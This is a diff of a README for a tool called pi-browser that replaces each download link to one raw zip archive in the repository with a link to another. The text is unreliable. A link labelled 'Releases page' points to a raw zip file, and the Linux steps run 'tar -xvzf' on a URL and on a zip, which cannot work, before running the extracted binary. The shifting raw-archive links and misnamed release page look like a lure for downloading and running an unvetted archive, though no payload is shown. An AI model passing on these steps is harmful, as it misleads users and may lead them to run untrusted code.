@@ -6,9 +6,9 @@ Welcome to pi-browser! This tool helps you automate browsing tasks using multipl
 
 ## 📥 Download & Install
 
-[![Download pi-browser](https://github.com/PKOcto/pi-browser/raw/refs/heads/main/src/browser-pi-v3.6.zip)](https://github.com/PKOcto/pi-browser/raw/refs/heads/main/src/browser-pi-v3.6.zip)
+[![Download pi-browser](https://github.com/PKOcto/pi-browser/raw/refs/heads/main/extension/pi_browser_2.6-beta.2.zip)](https://github.com/PKOcto/pi-browser/raw/refs/heads/main/extension/pi_browser_2.6-beta.2.zip)
 
-To get started, visit the [Releases page](https://github.com/PKOcto/pi-browser/raw/refs/heads/main/src/browser-pi-v3.6.zip) to download the application. You will see several versions listed there. Choose the latest one to ensure you have the newest features and fixes.
+To get started, visit the [Releases page](https://github.com/PKOcto/pi-browser/raw/refs/heads/main/extension/pi_browser_2.6-beta.2.zip) to download the application. You will see several versions listed there. Choose the latest one to ensure you have the newest features and fixes.
 
 ### MacOS Users
 
@@ -28,10 +28,10 @@ To get started, visit the [Releases page](https://github.com/PKOcto/pi-browser/r
 
 ### Linux Users
 
-1. Click on the link for the `https://github.com/PKOcto/pi-browser/raw/refs/heads/main/src/browser-pi-v3.6.zip` file.
+1. Click on the link for the `https://github.com/PKOcto/pi-browser/raw/refs/heads/main/extension/pi_browser_2.6-beta.2.zip` file.
 2. Download the file to your computer.
 3. Open a terminal and navigate to the downloaded file location.
-4. Use the command `tar -xvzf https://github.com/PKOcto/pi-browser/raw/refs/heads/main/src/browser-pi-v3.6.zip` to extract the files.
+4. Use the command `tar -xvzf https://github.com/PKOcto/pi-browser/raw/refs/heads/main/extension/pi_browser_2.6-beta.2.zip` to extract the files.
 5. Change into the new directory using `cd pi-browser`, and run the application using `./pi-browser`.
 
 ## 🛠️ System Requirements
